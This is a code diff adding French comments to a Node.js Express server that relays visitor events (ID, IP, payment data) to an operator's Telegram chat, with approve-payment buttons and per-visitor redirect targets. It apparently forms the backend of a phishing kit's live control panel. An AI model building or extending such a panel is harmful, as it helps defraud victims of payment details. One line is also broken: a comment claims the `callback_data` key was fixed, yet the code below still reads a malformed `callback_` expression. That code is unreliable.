@@ -14,6 +14,7 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 const sessions = new Map();
 
+// Nettoyage toutes les 30 min
 setInterval(() => {
   const now = Date.now();
   for (const [id, data] of sessions.entries()) {
@@ -21,6 +22,7 @@ setInterval(() => {
   }
 }, 900000);
 
+// Génère le texte de la notification
 function buildMessageText(data) {
   let text = `🆕 Nouvel utilisateur\n`;
   text += `🆔 ${data.visitorId}\n`;
@@ -41,6 +43,7 @@ function buildMessageText(data) {
   return text;
 }
 
+// ✅ CORRIGÉ : utilisation de `callback_data` (pas `callback_`)
 function buildButtons(data) {
   if (data.payment && !data.validated) {
     return [[{ text: "✅ Accepter paiement", callback_ `accept_${data.visitorId}` }]];
@@ -54,6 +57,7 @@ function buildButtons(data) {
   ];
 }
 
+// Met à jour ou crée la notification Telegram
 async function updateOrCreateNotification(data) {
   const text = buildMessageText(data);
   const reply_markup = { inline_keyboard: buildButtons(data) };
@@ -81,6 +85,7 @@ async function updateOrCreateNotification(data) {
   }
 }
 
+// Réception des événements frontend
 app.post('/event', async (req, res) => {
   const { type, visitorId, ip, eventData } = req.body;
   if (!visitorId || !ip) return res.status(400).json({ error: 'ID and IP required' });
@@ -108,6 +113,7 @@ app.post('/event', async (req, res) => {
   res.json({ ok: true });
 });
 
+// Webhook Telegram (boutons)
 app.post('/webhook', (req, res) => {
   const update = req.body;
   res.sendStatus(200);
@@ -156,11 +162,13 @@ app.post('/webhook', (req, res) => {
   }
 });
 
+// Frontend : vérifie la cible de redirection
 app.get('/target/:visitorId', (req, res) => {
   const session = sessions.get(req.params.visitorId);
   res.json({ target: session?.target || null });
 });
 
+// Définir le webhook Telegram
 app.get('/set-webhook', async (req, res) => {
   const url = `${process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`}/webhook`;
   try {
@@ -171,6 +179,7 @@ app.get('/set-webhook', async (req, res) => {
   }
 });
 
+// Écoute sur toutes les interfaces (obligatoire pour Render)
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`✅ Serveur démarré sur le port ${PORT}`);
 });
